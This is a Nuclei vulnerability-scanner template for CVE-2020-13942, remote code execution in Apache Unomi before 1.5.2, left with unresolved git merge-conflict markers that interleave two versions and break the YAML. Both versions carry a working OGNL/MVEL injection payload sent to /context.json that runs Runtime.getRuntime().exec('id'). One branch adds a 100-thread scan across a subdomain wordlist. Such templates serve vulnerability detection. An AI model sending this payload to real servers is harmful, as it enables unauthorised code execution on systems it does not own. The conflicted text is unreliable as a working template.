id: CVE-2020-13942

info:
<<<<<<< HEAD
  name: Apache Unomi Remote Code Execution
  author: dwisiswant0
  severity: critical
  description: |
    Remote Code Execution in Apache Unomi.
    Apache Unomi allows conditions to use OGNL and MVEL scripting which
    offers the possibility to call static Java classes from the JDK
    that could execute code with the permission level of the running Java process.
    This vulnerability affects all versions of Apache Unomi prior to 1.5.2. Apache Unomi users should upgrade to 1.5.2 or later.

  reference: |
    - https://securityboulevard.com/2020/11/apache-unomi-cve-2020-13942-rce-vulnerabilities-discovered/
    - https://twitter.com/chybeta/status/1328912309440311297
  tags: cve,cve2020,apache,rce
<<<<<<< HEAD
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.80
    cve-id: CVE-2020-13942
    cwe-id: CWE-74
=======
  name: Apache Unomi <1.5.2 - Remote Code Execution
  author: dwisiswant0
  severity: critical
  description: |
    Apache Unomi allows conditions to use OGNL and MVEL scripting which
    offers the possibility to call static Java classes from the JDK
    that could execute code with the permission level of the running Java process.
    This vulnerability affects all versions of Apache Unomi prior to 1.5.2.
  reference:
    - https://securityboulevard.com/2020/11/apache-unomi-cve-2020-13942-rce-vulnerabilities-discovered/
    - https://twitter.com/chybeta/status/1328912309440311297
    - https://nvd.nist.gov/vuln/detail/CVE-2020-13942
    - http://unomi.apache.org./security/cve-2020-13942.txt
    - https://lists.apache.org/thread.html/r4a8fa91836687eaca42b5420a778ca8c8fd3a3740e4cf4401acc9118@%3Cusers.unomi.apache.org%3E
  remediation: Apache Unomi users should upgrade to 1.5.2 or later.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-13942
    cwe-id: CWE-74
  tags: cve,cve2020,apache,rce
>>>>>>> 5d36d276 (add new stuff)

requests:
  - method: POST
    path:
      - "{{BaseURL}}/context.json"
    headers:
      Content-Type: application/json
    body: |
      {
        "filters": [
          {
            "id": "nuclei",
            "filters": [
              {
                "condition": {
                  "parameterValues": {
                    "nuclei": "script::Runtime.getRuntime().exec('id')"
                  },
                  "type": "profilePropertyCondition"
                }
              }
            ]
          }
        ],
        "sessionId": "nuclei"
      }
<<<<<<< HEAD
=======

requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100

    raw:
      - |
        POST /context.json HTTP/1.1
        Host: {{Subdomains}}
        Content-Type: application/json
        
        {
         "filters": [
           {
             "id": "nuclei",
             "filters": [
               {
                 "condition": {
                   "parameterValues": {
                     "nuclei": "script::Runtime.getRuntime().exec('id')"
                   },
                   "type": "profilePropertyCondition"
                 }
               }
             ]
           }
         ],
         "sessionId": "nuclei"
        }
>>>>>>> 18ddf72b (add new stuff)
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "application/json"
          - "context-profile-id"
        condition: and
        part: header
      - type: regex
=======

    matchers-condition: and
    matchers:
      - type: regex
        part: body
>>>>>>> 5d36d276 (add new stuff)
        regex:
          - "(profile|session)(Id|Properties|Segments)"
          - "[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}"
        condition: and
<<<<<<< HEAD
        part: body
=======

      - type: word
        part: header
        words:
          - "application/json"
          - "context-profile-id"
        condition: and

      - type: status
        status:
          - 200
# Enhanced by mp on 2022/05/16
>>>>>>> 5d36d276 (add new stuff)
